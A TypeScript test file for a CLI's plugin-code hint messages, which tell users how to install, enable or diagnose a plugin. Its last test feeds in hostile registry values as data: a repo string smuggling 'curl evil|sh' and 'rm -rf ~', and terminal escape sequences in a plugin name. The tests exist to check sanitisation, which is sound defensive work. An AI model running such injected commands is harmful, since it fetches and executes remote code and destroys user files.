import { expect, test } from "bun:test";
import type { RegistryPlugin } from "../../plugins/marketplace/model";
import type { GloomPlugin } from "../../types/plugin";
import type { IdleCliPlugin } from "../registry";
import { pluginCodeStop, type PluginCodeSources } from "./plugin-code";

const hackerNews: RegistryPlugin = {
  id: "hackernews", name: "Hacker News", tagline: "", repo: "gloom-sh/gloom-hackernews",
  author: { name: "Gloom", github: "gloom-sh" }, categories: [], targets: ["cli", "tui", "desktop", "web"], hosts: [],
  contributes: { panes: ["hackernews"], capabilities: [], broker: false, shortcuts: [{ code: "HN", name: "Hacker News", description: "" }] },
  tier: "official", bundled: false, stars: 0,
};

function plugin(id: string, name: string, prefix: string, label: string, targets?: GloomPlugin["targets"]): GloomPlugin {
  return {
    id, name, version: "1.0.0", ...(targets ? { targets } : {}),
    paneTemplates: [{ id: `${id}-pane`, paneId: id, label, description: "", shortcut: { prefix } }],
  };
}

const sources = (overrides: Partial<PluginCodeSources> = {}): PluginCodeSources => ({
  idle: [], running: [], loadRegistry: async () => [hackerNews], ...overrides,
});

const stop = (code: string, overrides: Partial<PluginCodeSources> = {}) => pluginCodeStop(code, sources(overrides), {
  rerun: `gloom fn ${code.toUpperCase()}`, capture: `gloom shot ${code.toUpperCase()}`,
});

// `catalog --all` listed HN and SOC from one profile, and `fn` in another said "Unknown function or pane".
test("a plugin's code that opens nothing names the plugin and the command that fixes it", async () => {
  expect(await stop("hn")).toEqual({
    message: "HN opens the Hacker News plugin, which is not installed.",
    details: "Install it: gloom install gloom-sh/gloom-hackernews\nThen run: gloom fn HN",
  });
  // A code the feed does not list, of a plugin that left the app; and one when the feed cannot be read.
  expect((await stop("AGENT"))?.details).toStartWith("Install it: gloom install gloom-sh/gloom-byok-ai");
  expect((await stop("TV", { loadRegistry: () => Promise.reject(new Error("offline")) }))?.message)
    .toBe("TV opens the TV plugin, which is not installed.");

  const social: IdleCliPlugin = { plugin: plugin("social", "Gloom Social", "SOC", "Gloom Social", ["desktop"]), reason: "target" };
  expect(await stop("SOC", { idle: [social] })).toEqual({
    message: "SOC opens the Gloom Social plugin, which runs in the desktop app only, not on the command line.",
    details: "See it as the desktop app draws it: gloom shot SOC\nOr type SOC in the desktop app's command bar.",
  });
  // `shot` draws only what the desktop app runs.
  const terminal: IdleCliPlugin = { plugin: plugin("gateway", "Gateway", "GW", "Gateway", ["tui"]), reason: "target" };
  expect((await stop("GW", { idle: [terminal] }))?.details).toBe("Type GW in the terminal app's command bar.");
  // Not installed, a plugin only the desktop app runs says how to install it as well as where it runs.
  const desktopOnly = { ...hackerNews, targets: ["desktop"] } as RegistryPlugin;
  expect(await stop("HN", { loadRegistry: async () => [desktopOnly] })).toEqual({
    message: "HN opens the Hacker News plugin, which is not installed, and runs in the desktop app only, not on the command line.",
    details: "Install it: gloom install gloom-sh/gloom-hackernews\nThen see it as the desktop app draws it: gloom shot HN\n"
      + "Or type HN in the desktop app's command bar.",
  });
  const off: IdleCliPlugin = { plugin: plugin("hackernews", "Hacker News", "HN", "Hacker News"), reason: "off" };
  expect((await stop("HN", { idle: [off] }))?.details).toBe("Turn it on: gloom plugin enable hackernews");
  // Installed under its folder but not loaded: the install command would not help.
  const failed: IdleCliPlugin = { plugin: { id: "gloom-hackernews", name: "gloom-hackernews", version: "" }, reason: "failed", directory: "gloom-hackernews" };
  expect(await stop("HN", { idle: [failed] })).toEqual({
    message: "HN opens the Hacker News plugin, which is installed but did not load.",
    details: "Check it: gloom plugin doctor gloom-hackernews",
  });
});

test("a code no plugin owns, or one a running plugin no longer declares, is left to the unknown-name answer", async () => {
  expect(await stop("ZZQX")).toBeNull();
  expect(await stop("HN", { running: ["hackernews"] })).toBeNull();
  // Someone else's plugin is never offered for a typed code.
  expect(await stop("HN", { loadRegistry: async () => [{ ...hackerNews, repo: "someone/gloom-hackernews" }] })).toBeNull();
});

// A registry entry's repo and names were printed as they came: a repo with a shell command and a line of its
// own, and an escape sequence in a name, reached the terminal.
test("what the registry says is printed as plain text, and only a plain gloom-sh repository is offered", async () => {
  for (const repo of ["gloom-sh/x; curl evil|sh\nThen run: rm -rf ~", "gloom-sh/x y", "gloom-sh/", "gloom-sh/..", "gloom-sh/a/b", "Gloom-sh/x"]) {
    expect(await stop("HN", { loadRegistry: async () => [{ ...hackerNews, repo }] })).toBeNull();
  }
  const named = { ...hackerNews, name: "Hacker\u001b[2J\u001b]8;;https://evil\u0007 News\nThen run: rm", contributes: {
    ...hackerNews.contributes!, shortcuts: [{ code: "HN", name: "Hacker\u0007 News\r", description: "" }],
  } } as RegistryPlugin;
  const answer = await stop("HN", { loadRegistry: async () => [named] });
  expect(answer?.message).toBe("HN opens Hacker News, from the Hacker News Then run: rm plugin, which is not installed.");
  expect(answer?.details.split("\n")).toEqual(["Install it: gloom install gloom-sh/gloom-hackernews", "Then run: gloom fn HN"]);
  expect(`${answer?.message}${answer?.details}`).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/);
});
